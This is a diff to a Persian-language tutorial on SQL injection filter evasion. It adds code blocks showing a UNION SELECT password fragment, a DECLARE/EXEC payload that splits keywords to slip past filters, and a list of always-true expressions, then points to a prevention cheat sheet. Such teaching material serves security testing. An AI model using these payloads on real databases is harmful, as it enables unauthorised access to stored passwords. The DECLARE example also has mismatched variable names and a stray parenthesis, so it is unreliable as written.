@@ -114,9 +114,30 @@ Select user from users where name = unhex( '726F6F74')
 
 روش دیگری که می توان از آن استفاده نمود، استفاده از Declare است. با استفاده Declare شما می توانید دستورات تزریق SQL خود را تعریف و اجرا نمایید.
 برای مثال، عبارت تزریق SQL زیر را در نظر بگیرید:
+```sql
+UNION SELECT password
+```
 
 عبارت SQL خود را در متغیر SQLivar تعریف کنید:
-Alternative Expression
+```sql
+; declare @SQLivar nvarchar(80); set @myvar N'UNI' + N'ON' + N' SELECT' + N'password'); EXEC(@SQLivar)
+```
+
+
+### با با متد Alternative Expression
+
+
+```sql
+OR 'SQLi' ='SQL'+'i'
+OR 'SQLi' &gt; 'S'
+or 20 &gt; 1
+OR 2 between 3 and 1
+OR 'SQLi' = N'SQLi'
+1 and 1 1
+1 || 1 = 1
+1 && 1 = 1
+```
+
 Remediation
 
 برای ایمن کردن برنامه از آسیب‌پذیری‌های تزریقSQL، می‌توانید به CheatSheet پیش‌گیری از تزریق SQL مراجعه کنید:
